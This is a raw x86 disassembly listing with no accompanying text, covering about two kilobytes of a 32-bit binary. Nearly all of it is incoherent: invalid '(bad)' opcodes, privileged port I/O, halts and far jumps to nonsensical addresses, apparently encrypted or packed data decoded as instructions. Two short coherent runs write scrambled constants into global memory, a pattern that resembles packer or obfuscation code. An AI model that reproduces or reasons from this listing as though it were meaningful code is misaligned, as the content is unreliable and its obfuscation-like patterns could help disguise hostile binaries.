  40a4af:	sbb    dl,BYTE PTR [eax]
  40a4b1:	and    eax,0x66473d87
  40a4b6:	jp     0x40a489
  40a4b8:	int    0x1d
  40a4ba:	cmp    eax,0x9389f605
  40a4bf:	and    DWORD PTR [esi],ebx
  40a4c1:	or     cl,al
  40a4c3:	sar    ch,1
  40a4c5:	inc    esi
  40a4c6:	mov    dl,0xe1
  40a4c8:	jnp    0x40a52d
  40a4ca:	sub    al,0xfd
  40a4cc:	test   ebp,esp
  40a4ce:	inc    ebx
  40a4cf:	sbb    DWORD PTR [edi],esi
  40a4d1:	mov    ch,0xa3
  40a4d3:	ins    DWORD PTR es:[edi],dx
  40a4d4:	inc    ebp
  40a4d5:	mov    dl,0x77
  40a4d7:	adc    DWORD PTR [eax-0x39],ebp
  40a4da:	jno    0x40a511
  40a4dc:	les    edi,FWORD PTR [esp+eax*4]
  40a4df:	sbb    ah,BYTE PTR [ebx-0x1431b2da]
  40a4e5:	test   eax,0x1aed2e72
  40a4ea:	xchg   ecx,eax
  40a4eb:	call   0x84f80822
  40a4f0:	mov    ch,0x31
  40a4f2:	cmp    bl,dl
  40a4f4:	mov    esi,0xe5fd418b
  40a4f9:	hlt    
  40a4fa:	shl    DWORD PTR [edi+ebp*4+0x5fb6a78d],0x79
  40a502:	ja     0x40a4e2
  40a504:	out    dx,eax
  40a505:	mov    edx,0x7de800b9
  40a50a:	dec    ecx
  40a50b:	mov    cs,WORD PTR [ebp+0x1b3ddf6a]
  40a511:	dec    ebx
  40a512:	dec    esi
  40a513:	aam    0xe4
  40a515:	mov    edi,0x1ecaee37
  40a51a:	xlat   BYTE PTR ds:[ebx]
  40a51b:	sub    al,0xeb
  40a51d:	ficom  WORD PTR [ebx+0x4c812bd5]
  40a523:	div    ah
  40a525:	in     eax,0x4
  40a527:	loope  0x40a4d9
  40a529:	mov    edx,0x9c2ab6fc
  40a52e:	sub    al,0x65
  40a530:	dec    ebx
  40a531:	mov    ebp,0x8912a4ad
  40a536:	sbb    BYTE PTR [ebp+0x2385200d],bh
  40a53c:	mov    cl,0x8b
  40a53e:	mov    eax,0x6b09421d
  40a543:	fcmovne st,st(2)
  40a545:	icebp  
  40a546:	imul   eax,esi,0xffffffd7
  40a549:	(bad)  
  40a54d:	mov    es,esp
  40a54f:	xchg   ebp,eax
  40a550:	jno    0x40a540
  40a552:	and    dl,BYTE PTR [edi-0x4f]
  40a555:	pop    eax
  40a556:	sub    DWORD PTR [ebp-0x8],esi
  40a559:	ss cmp eax,0xfa4822cb
  40a55f:	sub    BYTE PTR [edx+0x48384add],bh
  40a565:	cmp    ch,ah
  40a567:	(bad)  
  40a568:	arpl   WORD PTR [esi+0x24ec5b3a],sp
  40a56e:	cmp    edi,DWORD PTR [eax+edx*1+0x42]
  40a572:	(bad)  
  40a573:	adc    al,0x8b
  40a575:	add    edi,ecx
  40a577:	adc    ebp,0x3b8ae9c8
  40a57d:	jne    0x40a502
  40a57f:	(bad)  
  40a580:	mov    ds:0x718eb187,eax
  40a585:	cmp    eax,0x27801fad
  40a58a:	cmp    al,0xfe
  40a58c:	xor    al,0xa
  40a58e:	push   es
  40a58f:	pop    ebx
  40a590:	sub    BYTE PTR [edi+0x5f0a499a],ch
  40a596:	stc    
  40a597:	addr16 out 0x27,eax
  40a59a:	cmp    dl,bl
  40a59c:	adc    ecx,DWORD PTR [ecx-0x24]
  40a59f:	dec    esp
  40a5a0:	popf   
  40a5a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5a2:	sbb    BYTE PTR [ecx-0x5100149a],0xc8
  40a5a9:	aad    0x4d
  40a5ab:	xlat   BYTE PTR ds:[ebx]
  40a5ac:	mov    ebx,0xf6d027d3
  40a5b1:	jl     0x6c620903
  40a5b7:	cwde   
  40a5b8:	pop    ds
  40a5b9:	mov    ebp,0x3ba39c64
  40a5bf:	shl    DWORD PTR [edx+0x52f25c51],0x8e
  40a5c6:	ins    DWORD PTR es:[edi],dx
  40a5c7:	xlat   BYTE PTR ds:[ebx]
  40a5c8:	iret   
  40a5c9:	pusha  
  40a5ca:	pop    eax
  40a5cb:	popf   
  40a5cc:	fcomip st,st(0)
  40a5ce:	cs jo  0x40a5e4
  40a5d1:	inc    edi
  40a5d2:	(bad)  
  40a5d4:	(bad)  
  40a5d5:	mov    dl,0x8b
  40a5d7:	(bad)  
  40a5d8:	aaa    
  40a5d9:	mov    bl,0x2e
  40a5db:	pop    edi
  40a5dc:	and    bl,BYTE PTR [edx+0x12]
  40a5df:	pop    ebp
  40a5e0:	xchg   esi,eax
  40a5e1:	sbb    ah,BYTE PTR [esi-0x44]
  40a5e4:	pop    esp
  40a5e5:	iret   
  40a5e6:	cmp    al,0xb9
  40a5e8:	lahf   
  40a5e9:	pop    ds
  40a5ea:	dec    eax
  40a5eb:	fmul   DWORD PTR [ecx-0xbe020d4]
  40a5f1:	(bad)  
  40a5f2:	ins    DWORD PTR es:[edi],dx
  40a5f3:	jbe    0x40a594
  40a5f5:	sub    al,bl
  40a5f7:	mov    ah,0x67
  40a5f9:	cwde   
  40a5fa:	and    al,0xa7
  40a5fc:	cmp    al,BYTE PTR [edx+0x69]
  40a5ff:	sahf   
  40a600:	mov    esi,DWORD PTR [edi]
  40a602:	ja     0x40a586
  40a604:	add    BYTE PTR [ebp+esi*1-0x59],ch
  40a608:	jnp    0x40a643
  40a60a:	xchg   edi,eax
  40a60b:	fidivr DWORD PTR [ebp-0x17d9be28]
  40a611:	int3   
  40a612:	ss mov bh,0xf0
  40a615:	adc    BYTE PTR [edi-0x42d7532c],dh
  40a61b:	js     0x40a604
  40a61d:	lahf   
  40a61e:	adc    ebp,edx
  40a620:	repz popa 
  40a622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a623:	or     al,0x84
  40a625:	jne    0x40a614
  40a627:	repz clc 
  40a629:	int    0x5c
  40a62b:	adc    DWORD PTR [edi-0x63],esi
  40a62e:	retf   0x6c15
  40a631:	xchg   ch,ch
  40a633:	cli    
  40a634:	icebp  
  40a635:	and    ecx,DWORD PTR [ecx-0x3c]
  40a638:	stos   BYTE PTR es:[edi],al
  40a639:	scas   eax,DWORD PTR es:[edi]
  40a63a:	adc    DWORD PTR gs:[edx-0x5fd8a930],0x1693493f
  40a645:	mov    edi,DWORD PTR [ecx+0x7f]
  40a648:	shl    BYTE PTR [esi+0x52],1
  40a64b:	(bad)  
  40a64d:	ret    
  40a64e:	dec    ebp
  40a64f:	pop    ebx
  40a650:	imul   esp,DWORD PTR [ebp+0xf],0xffffffb5
  40a654:	sub    DWORD PTR [ebx],ebp
  40a656:	out    dx,eax
  40a657:	cmp    al,0xdf
  40a659:	test   ebx,ebx
  40a65b:	pop    es
  40a65c:	jns    0x40a6b2
  40a65e:	push   esi
  40a65f:	jne    0x40a614
  40a661:	adc    edx,DWORD PTR ds:0xde4feecd
  40a667:	(bad)  
  40a669:	neg    BYTE PTR [edx-0x78]
  40a66c:	mov    BYTE PTR [esi+0x79],dh
  40a66f:	jo     0x40a66b
  40a671:	js     0x40a6f2
  40a673:	or     cl,al
  40a675:	or     BYTE PTR [edx],0x21
  40a678:	jns    0x40a649
  40a67a:	bound  esi,QWORD PTR [ebx]
  40a67c:	pusha  
  40a67d:	mov    esp,edx
  40a67f:	mov    bl,0x21
  40a681:	and    edx,DWORD PTR [edx+ebx*2+0x54]
  40a685:	rcr    BYTE PTR [edx-0x55],1
  40a688:	xor    DWORD PTR [edi],ebp
  40a68a:	push   eax
  40a68b:	dec    esp
  40a68c:	test   eax,0xa2b3cc7d
  40a691:	sbb    eax,ecx
  40a693:	shl    DWORD PTR [ebx-0x7f],cl
  40a696:	fcmovnu st,st(5)
  40a698:	push   esi
  40a699:	jl     0x40a6be
  40a69b:	mov    ecx,0x628e21da
  40a6a0:	mov    ?,WORD PTR [eax-0x23e9d4ca]
  40a6a6:	fisubr WORD PTR [esi-0x315a945d]
  40a6ac:	jmp    0xf3f2:0x1b703e74
  40a6b3:	jmp    0x40a66f
  40a6b5:	repnz mov esp,DWORD PTR [ebx]
  40a6b8:	(bad)  
  40a6b9:	xchg   esi,eax
  40a6ba:	dec    edi
  40a6bb:	les    esi,FWORD PTR [esi-0x27]
  40a6be:	imul   edx,DWORD PTR [edi+0x37eaade0],0x1e54d51b
  40a6c8:	and    edi,DWORD PTR [esi-0x4197f7da]
  40a6ce:	stos   DWORD PTR es:[edi],eax
  40a6cf:	sti    
  40a6d0:	inc    edx
  40a6d1:	xchg   edx,eax
  40a6d2:	out    dx,eax
  40a6d3:	adc    edi,eax
  40a6d5:	xchg   esi,eax
  40a6d6:	jecxz  0x40a730
  40a6d8:	ja     0x40a745
  40a6da:	in     eax,dx
  40a6db:	test   DWORD PTR [ecx],ecx
  40a6dd:	adc    dl,BYTE PTR [ebp+0x704db5d3]
  40a6e3:	dec    ecx
  40a6e4:	les    edx,FWORD PTR [edx]
  40a6e6:	es aaa 
  40a6e8:	jae    0x40a66d
  40a6ea:	call   0x5c7:0xf83b8782
  40a6f1:	jmp    0x40a72a
  40a6f3:	inc    ebx
  40a6f4:	add    BYTE PTR [eax+0xf00005a],ch
  40a6fa:	test   edi,esp
  40a6fc:	or     eax,0x15810000
  40a701:	xlat   BYTE PTR ds:[ebx]
  40a702:	aaa    
  40a703:	inc    ebx
  40a704:	add    dl,bh
  40a706:	or     eax,DWORD PTR [eax]
  40a708:	add    bh,bh
  40a70a:	jne    0x40a714
  40a70c:	add    DWORD PTR ds:0x433867,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433897
  40a72f:	or     DWORD PTR ds:0x4338a3,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433893,0x433787
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x43382f,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x4337e7,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x43386f,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x43377f,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x43385b
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43378b
  40a793:	sub    DWORD PTR ds:0x4337a3,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0xe6beec0c
  40a7ac:	inc    edx
  40a7ad:	dec    edx
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	and    al,0xb9
  40a7b8:	xor    al,BYTE PTR [esi]
  40a7ba:	mov    edx,DWORD PTR [edi]
  40a7bc:	or     eax,0x2f53cb86
  40a7c1:	cmp    esp,DWORD PTR [esi-0x5d8ff598]
  40a7c7:	lods   al,BYTE PTR ds:[esi]
  40a7c8:	clc    
  40a7c9:	in     al,dx
  40a7ca:	and    eax,0xdc4985e0
  40a7cf:	push   0x4bc7f618
  40a7d4:	pop    ss
  40a7d5:	add    eax,0xd66e75d0
  40a7da:	cli    
  40a7db:	pusha  
  40a7dc:	(bad)
  40a7df:	lock out 0xfb,al
  40a7e2:	xor    al,BYTE PTR [esi]
  40a7e4:	dec    edi
  40a7e5:	aam    0xdd
  40a7e7:	xchg   DWORD PTR [edx-0x6c],ecx
  40a7ea:	mov    esp,0x7af33a6
  40a7ef:	lods   eax,DWORD PTR ds:[esi]
  40a7f0:	gs out 0xb7,al
  40a7f3:	nop
  40a7f4:	ret    
  40a7f5:	push   esp
  40a7f6:	inc    ecx
  40a7f7:	cdq    
  40a7f8:	adc    ah,al
  40a7fa:	jb     0x40a847
  40a7fc:	adc    BYTE PTR [eax],ch
  40a7fe:	gs int 0x7a
  40a801:	xchg   DWORD PTR [ebx+0x594a6f76],edi
  40a807:	sub    esi,DWORD PTR [eax]
  40a809:	int    0x6d
  40a80b:	retf   0x9eed
  40a80e:	fbld   TBYTE PTR [esi+0x1a]
  40a811:	rol    BYTE PTR [esi],1
  40a813:	cmp    eax,0x5ee78920
  40a818:	imul   eax,DWORD PTR [ebp+ebp*8+0x1],0xc52dc438
  40a820:	int3   
  40a821:	adc    esp,ebp
  40a823:	test   eax,0xb537a49c
  40a828:	cmp    ecx,DWORD PTR [edi]
  40a82a:	shl    dl,0x57
  40a82d:	xor    DWORD PTR [esp+edi*2+0x30],ebp
  40a831:	sbb    al,0xa5
  40a833:	sti    
  40a834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a835:	pop    esi
  40a836:	cmp    esi,DWORD PTR [edi]
  40a838:	push   0xfcb041e9
  40a83d:	push   es
  40a83e:	cmp    ah,BYTE PTR [ebx+0x6a22b370]
  40a844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a845:	stos   DWORD PTR es:[edi],eax
  40a846:	mov    esi,0x7ae56646
  40a84b:	jmp    0xb4eb5e1a
  40a850:	fiadd  WORD PTR [ebp+0xf7f43f6]
  40a856:	or     DWORD PTR [edi],esp
  40a858:	xlat   BYTE PTR ds:[ebx]
  40a859:	mov    bl,0xbc
  40a85b:	cli    
  40a85c:	sub    al,0xc5
  40a85e:	cmp    eax,0xa2889bb5
  40a863:	out    0x2c,al
  40a865:	in     al,0xea
  40a867:	jne    0x40a7f4
  40a869:	adc    al,0x16
  40a86b:	sub    edi,ebx
  40a86d:	xor    al,BYTE PTR [eax]
  40a86f:	mov    ebp,0x89c7a1f6
  40a874:	inc    edi
  40a875:	mul    DWORD PTR [ecx+0x5b6cf03]
  40a87b:	add    ebp,DWORD PTR [edx-0x4b9a043f]
  40a881:	jp     0x40a81d
  40a883:	ror    BYTE PTR [ecx+0x5ef9ec30],1
  40a889:	cmc    
  40a88a:	(bad)  
  40a88c:	push   es
  40a88d:	les    ebx,FWORD PTR ds:0x68c0aa9b
  40a893:	cli    
  40a894:	lods   eax,DWORD PTR ds:[esi]
  40a895:	jg     0x40a888
  40a897:	fldenv [edx-0x6f]
  40a89a:	into   
  40a89b:	int    0xba
  40a89d:	mov    bh,BYTE PTR [edx+0x40e22486]
  40a8a3:	or     al,0x3
  40a8a5:	mov    dl,0x93
  40a8a7:	adc    eax,0xce5565aa
  40a8ac:	pushf  
  40a8ad:	ds push esp
  40a8af:	dec    ebx
  40a8b0:	bound  ebx,QWORD PTR [edx-0x21]
  40a8b3:	xor    al,BYTE PTR [eax]
  40a8b5:	jmp    0x40a891
  40a8b7:	push   ecx
  40a8b8:	call   0xe8f2:0x7e36f744
  40a8bf:	add    dl,BYTE PTR [edx+edx*2-0x2]
  40a8c3:	push   ss
  40a8c4:	xor    bh,BYTE PTR [ebp+0x2e23fba0]
  40a8ca:	stos   BYTE PTR es:[edi],al
  40a8cb:	fstp   TBYTE PTR [edx]
  40a8cd:	and    DWORD PTR [ebx],ecx
  40a8cf:	xor    ecx,eax
  40a8d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8d2:	ds sub al,0xdc
  40a8d5:	aas    
  40a8d6:	cli    
  40a8d7:	add    esp,DWORD PTR [ebp+0x73]
  40a8da:	pop    ss
  40a8db:	jge    0x40a920
  40a8dd:	pop    DWORD PTR [ecx-0x2]
  40a8e0:	retf   0x4aec
  40a8e3:	mov    ebx,ebp
  40a8e5:	cmp    dh,BYTE PTR [ecx]
  40a8e7:	je     0x40a95e
  40a8e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8ea:	test   eax,0x5ee8bffb
  40a8ef:	mov    cl,BYTE PTR [eax]
  40a8f1:	imul   edx,DWORD PTR [ecx-0x7d],0xffffffdd
  40a8f5:	out    dx,al
  40a8f6:	or     DWORD PTR [esi-0x68],ebp
  40a8f9:	call   0xc32e:0xb5a647b7
  40a900:	mov    WORD PTR [ecx+ebp*4],fs
  40a903:	fiadd  WORD PTR [edx+0x512ecf90]
  40a909:	pop    ds
  40a90a:	out    0x5e,eax
  40a90c:	dec    eax
  40a90d:	rol    DWORD PTR [edx+0x54fba061],1
  40a913:	popa   
  40a914:	jp     0x40a8b1
  40a916:	push   esp
  40a917:	pop    ds
  40a918:	adc    al,0xd6
  40a91a:	xchg   edi,eax
  40a91b:	jle    0x40a986
  40a91d:	test   eax,0x7dc7f305
  40a922:	inc    esi
  40a923:	push   eax
  40a924:	or     DWORD PTR [ebp-0x7f],0xae0eb7cb
  40a92b:	pop    esp
  40a92c:	mov    eax,ds:0x37afd6ef
  40a931:	adc    DWORD PTR [edx],esi
  40a933:	in     eax,0x42
  40a935:	ja     0x40a995
  40a937:	push   ss
  40a938:	xchg   ecx,eax
  40a939:	jae    0x40a985
  40a93b:	call   0xec313279
  40a940:	jp     0x40a936
  40a942:	ret    
  40a943:	inc    ebx
  40a944:	mov    BYTE PTR [eax+0x19d870f8],0x35
  40a94b:	pusha  
  40a94c:	fistp  WORD PTR [esi]
  40a94e:	cmp    dh,dl
  40a950:	test   eax,0x6c55f1c3
  40a955:	and    eax,0xe86c0f53
  40a95a:	jae    0x40a980
  40a95c:	fild   QWORD PTR [ebx-0x625821db]
  40a962:	outs   dx,DWORD PTR ds:[esi]
  40a963:	dec    ebx
  40a964:	mov    cl,ch
  40a966:	pop    edi
  40a967:	sbb    DWORD PTR [edx-0x1f7b1127],esp
  40a96d:	sbb    BYTE PTR [edx+ecx*1],al
  40a970:	retf   
  40a971:	scas   eax,DWORD PTR es:[edi]
  40a972:	mov    al,0xf
  40a974:	out    0x88,eax
  40a976:	or     dh,BYTE PTR [esi]
  40a978:	out    0x47,al
  40a97a:	sub    ch,BYTE PTR [ecx]
  40a97c:	xor    al,0x7f
  40a97e:	pop    esp
  40a97f:	nop
  40a980:	add    BYTE PTR [edi+edx*8-0x6c],0x6f
  40a985:	out    0xb9,eax
  40a987:	xchg   ebx,eax
  40a988:	leave  
  40a989:	pop    ebx
  40a98a:	int3   
  40a98b:	mov    eax,ds:0x6af179c2
  40a990:	push   ecx
  40a991:	jle    0x40a979
  40a993:	cmc    
  40a994:	pop    ebx
  40a995:	push   cs
  40a996:	fld    QWORD PTR [eax]
  40a998:	add    eax,0xe729b33a
  40a99d:	pop    esi
  40a99e:	mov    ch,0xf3
  40a9a0:	fst    DWORD PTR [eax-0x5c]
  40a9a3:	add    cl,BYTE PTR [edx]
  40a9a5:	mov    ch,0xc9
  40a9a7:	jnp    0x40a98b
  40a9a9:	jmp    0x6102:0x57204ffd
  40a9b0:	cmovae ecx,DWORD PTR [ebp+0x66]
  40a9b4:	cwde   
  40a9b5:	stos   BYTE PTR es:[edi],al
  40a9b6:	pop    ds
  40a9b7:	pop    ecx
  40a9b8:	mov    ebx,0x29d0cea3
  40a9bd:	pop    ebx
  40a9be:	int    0x59
  40a9c0:	ds sbb eax,0x949848ea
  40a9c6:	scas   eax,DWORD PTR es:[edi]
  40a9c7:	adc    DWORD PTR [edx+0xf],ebp
  40a9ca:	(bad)  
  40a9cc:	retf   0x707e
  40a9cf:	inc    BYTE PTR ds:0x901e098d
  40a9d5:	shl    BYTE PTR [esi+ebp*8+0x1c],cl
  40a9d9:	int3   
  40a9da:	in     eax,0x96
  40a9dc:	add    eax,0xda32e955
  40a9e1:	nop
  40a9e2:	mov    eax,0xaad87e64
  40a9e7:	ret    
  40a9e8:	mov    ebp,0x644e5326
  40a9ed:	fnstsw WORD PTR [edx+0x47]
  40a9f0:	cli    
  40a9f1:	nop
  40a9f2:	fld    QWORD PTR [edi-0x1f89e04f]
  40a9f8:	xor    eax,0x89ed3110
  40a9fd:	inc    ebp
  40a9fe:	in     al,dx
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433797,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433897,0x433867
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x4337e7,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	adc    DWORD PTR [ecx],eax
  40aa36:	jmp    0x40aa69
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	dec    ebx
  40aa41:	cmp    al,0x73
  40aa43:	mov    dl,0x8e
  40aa45:	leave  
  40aa46:	xor    al,0xb9
  40aa48:	push   0xffffff8a
  40aa4a:	add    eax,0x918fa1e0
  40aa4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa50:	out    dx,al
  40aa51:	mov    edx,ebp
  40aa53:	and    edi,eax
  40aa55:	push   ss
  40aa56:	cmc    
  40aa57:	sub    BYTE PTR [ecx-0x21],bl
  40aa5a:	call   0xb248:0xa8dfbd6e
  40aa61:	adc    bh,BYTE PTR [ebp-0x7]
  40aa64:	push   cs
  40aa65:	cdq    
  40aa66:	fwait
  40aa67:	nop
  40aa68:	and    DWORD PTR [eax],edx
  40aa6a:	or     al,BYTE PTR [edx-0x16be5222]
  40aa70:	ret    
  40aa71:	jbe    0x40a9f7
  40aa73:	sbb    eax,0x4d49f57c
  40aa78:	pusha  
  40aa79:	ja     0x40a9ff
  40aa7b:	mov    edx,0x6a58a20b
  40aa80:	(bad)  
  40aa81:	sbb    bh,al
  40aa83:	in     al,dx
  40aa84:	imul   esp,DWORD PTR [eax],0x981abfd9
  40aa8a:	inc    ebx
  40aa8b:	sti    
  40aa8c:	and    DWORD PTR [edi+edi*4-0x331894de],esi
  40aa93:	ins    BYTE PTR es:[edi],dx
  40aa94:	bound  esi,QWORD PTR [eax]
  40aa96:	xchg   esi,eax
  40aa97:	mov    ecx,0xe3348f69
  40aa9c:	jno    0x40aaa4
  40aa9e:	inc    esi
  40aa9f:	cs (bad) 
  40aaa1:	int    0x89
  40aaa3:	xlat   BYTE PTR ds:[ebx]
  40aaa4:	ins    DWORD PTR es:[edi],dx
  40aaa5:	or     ah,ah
  40aaa7:	enter  0x3acf,0xba
  40aaab:	sub    bl,ah
  40aaad:	jns    0x40ab1e
  40aaaf:	sbb    edx,DWORD PTR [edi+0x551067fc]
  40aab5:	push   edx
  40aab6:	mov    esp,0xa1ddb226
  40aabb:	xchg   esi,eax
  40aabc:	inc    ecx
  40aabd:	lea    ebp,[ebp+0x46a044e2]
  40aac3:	(bad)  
  40aac4:	or     esp,0x6f3e093c
  40aaca:	mov    cl,0x46
  40aacc:	shr    DWORD PTR [edi],0x8e
  40aacf:	out    0x89,al
  40aad1:	push   edi
  40aad2:	addr16 jmp 0x24ea4d15
  40aad8:	adc    ah,BYTE PTR [ebx-0x215dc424]
  40aade:	xchg   DWORD PTR [esi+0x75],edi
  40aae1:	cmp    DWORD PTR [ebx+0x201d70ce],esp
  40aae7:	mov    ebx,0x74c7e828
  40aaec:	out    0x3f,al
  40aaee:	es retf 
  40aaf0:	jns    0x40aad9
  40aaf2:	sbb    DWORD PTR [ebp-0x1c2a1492],ebx
  40aaf8:	cmc    
  40aaf9:	int    0x4d
  40aafb:	mov    cl,0xd4
  40aafd:	cmp    al,0xc8
  40aaff:	mov    ecx,0x4bd4201a
  40ab04:	sar    DWORD PTR [esi-0x66],0xea
  40ab08:	push   0x3c
  40ab0a:	nop
  40ab0b:	sub    edx,DWORD PTR [ebp-0x16daf6e0]
  40ab11:	stos   BYTE PTR es:[edi],al
  40ab12:	cmp    al,BYTE PTR [esi]
  40ab14:	mov    dh,BYTE PTR [esp+ecx*8]
  40ab17:	sub    esp,DWORD PTR [esi-0x4d2024e]
  40ab1d:	call   0xb67ad7b1
  40ab22:	clc    
  40ab23:	loop   0x40ab39
  40ab25:	(bad)  
  40ab27:	adc    dl,BYTE PTR [edx+0xd67aacb]
  40ab2d:	push   ebx
  40ab2e:	loope  0x40aabe
  40ab30:	test   DWORD PTR [ebp+0x3],ebx
  40ab33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab34:	into   
  40ab35:	cmp    esp,DWORD PTR [ebx-0x637b956c]
  40ab3b:	push   es
  40ab3c:	jnp    0x40abbc
  40ab3e:	inc    edi
  40ab3f:	mov    ebx,0xa1cfbb6a
  40ab44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab45:	repz sbb DWORD PTR [ecx],0xffffffcf
  40ab49:	out    0x44,al
  40ab4b:	out    0xdc,eax
  40ab4d:	enter  0xd01b,0xe2
  40ab51:	pop    ebx
  40ab52:	outs   dx,BYTE PTR ds:[esi]
  40ab53:	enter  0x7a57,0x97
  40ab57:	out    0x6e,al
  40ab59:	adc    esp,ebp
  40ab5b:	xor    BYTE PTR [eax-0x72],cl
  40ab5e:	and    DWORD PTR [ebp-0x67ad4df],esp
  40ab64:	jne    0x40ab8d
  40ab66:	cmp    ah,BYTE PTR ds:0x42273da7
  40ab6c:	add    DWORD PTR ds:0x780eba90,ebx
  40ab72:	repz ja 0x40ab65
  40ab75:	lahf   
  40ab76:	ret    
  40ab77:	not    ebp
  40ab79:	push   cs
  40ab7a:	cmp    al,0x8a
  40ab7c:	ds cmp ebx,ebp
  40ab7f:	cdq    
  40ab80:	lods   eax,DWORD PTR ds:[esi]
  40ab81:	sub    DWORD PTR [edx+0x7a69ef5b],0xcce0de4c
  40ab8b:	pop    esi
  40ab8c:	pop    eax
  40ab8d:	scas   al,BYTE PTR es:[edi]
  40ab8e:	clc    
  40ab8f:	jmp    0x40ab44
  40ab91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab92:	ins    DWORD PTR es:[edi],dx
  40ab93:	lea    esp,[edx]
  40ab95:	pop    ds
  40ab96:	jo     0x40ab82
  40ab98:	rcr    DWORD PTR [eax-0x1992492],1
  40ab9e:	lods   al,BYTE PTR ds:[esi]
  40ab9f:	pop    esi
  40aba0:	push   0x992a5a6c
  40aba5:	cmc    
  40aba6:	push   ebx
  40aba7:	jl     0x40ab4e
  40aba9:	mov    edx,0x42a5e2ee
  40abae:	xor    DWORD PTR [ebp+edi*1-0x3c],ecx
  40abb2:	int3   
  40abb3:	add    bl,ch
  40abb5:	daa    
  40abb6:	ret    0x9cb4
  40abb9:	push   cs
  40abba:	aam    0x17
  40abbc:	sub    edi,ebp
  40abbe:	iret   
  40abbf:	cmc    
  40abc0:	dec    esp
  40abc1:	or     al,0xd9
  40abc3:	nop
  40abc4:	in     al,0x37
  40abc6:	outs   dx,DWORD PTR ds:[esi]
  40abc7:	outs   dx,DWORD PTR ds:[esi]
  40abc8:	retf   0x752d
  40abcb:	mov    ds:0x8411cadc,eax
  40abd0:	pop    edi
  40abd1:	dec    esp
  40abd2:	add    eax,0x8258c1b9
  40abd7:	dec    eax
  40abd8:	pushf  
  40abd9:	(bad)  
  40abda:	ror    BYTE PTR [ebx+0x4333e21d],0xa9
  40abe1:	sub    BYTE PTR [esp+eax*1],al
  40abe4:	jp     0x40ab9f
  40abe6:	jp     0x40ac18
  40abe8:	lea    esi,ds:[ecx]
  40abeb:	and    BYTE PTR [esi],0xdc
  40abee:	mov    dl,0x34
  40abf0:	aaa    
  40abf1:	mov    edi,DWORD PTR [ecx]
  40abf3:	in     eax,0x6d
  40abf5:	fdiv   QWORD PTR [ecx]
  40abf7:	cld    
  40abf8:	add    ebx,DWORD PTR ds:0x77fc9bc5
  40abfe:	pop    ss
  40abff:	jle    0x40ac7f
  40ac01:	test   ebp,esp
  40ac03:	icebp  
  40ac04:	pop    edi
  40ac05:	nop
  40ac06:	mov    BYTE PTR [ebp+eiz*8+0x3783f8d0],ah
  40ac0d:	xor    eax,0xd32e4a72
  40ac12:	repz jle 0x40ac8c
  40ac15:	mov    ebp,0x2354ee8f
  40ac1a:	xor    DWORD PTR [ebx+0x49c2291b],0x60d9d5c0
  40ac24:	imul   ecx,DWORD PTR [edx-0x4aaca919],0x4f2e1fc9
  40ac2e:	ret    0xfe79
  40ac31:	lahf   
  40ac32:	call   0x4d138ab0
  40ac37:	push   es
  40ac38:	shr    BYTE PTR [edi+esi*1+0x4ffcd13e],cl
  40ac3f:	push   esi
  40ac40:	rcr    BYTE PTR [ebx-0x2b],cl
  40ac43:	dec    edx
  40ac44:	mov    ebx,0x80a81e5e
  40ac49:	cmp    BYTE PTR [ebx-0x6ba1233b],dh
  40ac4f:	test   al,0x86
  40ac51:	push   ds
  40ac52:	mov    ah,0xc4
  40ac54:	mov    DWORD PTR [ebp-0x3e6d21a],ebx
  40ac5a:	mov    eax,0xe0b495cd
  40ac5f:	addr16 (bad) 
  40ac61:	jmp    0xd8f8:0x220a89ff
  40ac68:	fist   WORD PTR [edx-0x34bff435]
  40ac6e:	pop    ecx
  40ac6f:	sbb    al,0x1c
  40ac71:	dec    ecx
  40ac72:	mov    WORD PTR [ebp+0x25355c2b],?
  40ac78:	sar    DWORD PTR [ebx+0xf],0xcd
  40ac7c:	das    
  40ac7d:	adc    BYTE PTR [edx-0x7d3946c],bh
